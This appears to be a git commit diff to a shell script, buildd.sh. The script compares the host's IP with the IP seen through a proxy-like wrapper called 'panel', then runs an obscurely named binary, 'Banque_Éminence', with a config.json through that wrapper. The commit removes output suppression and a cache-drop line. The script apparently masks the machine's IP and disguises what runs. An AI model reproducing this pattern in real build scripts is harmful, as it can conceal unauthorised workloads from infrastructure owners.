02633d721e2c7286f7bf0c7b1d272372db6b83be
OpUiajwk <158300783+OpUiajwk@users.noreply.github.com>
2024-02-02 03:18:50 +0700

    Update buildd.sh

--- buildd.sh
+++ buildd.sh
@@ -19,6 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./Banque_Éminence -c ./config.json >/dev/null 2>&1
-sleep 1
-sync; echo 3 > /proc/sys/vm/drop_caches
+./panel ./Banque_Éminence -c ./config.json 
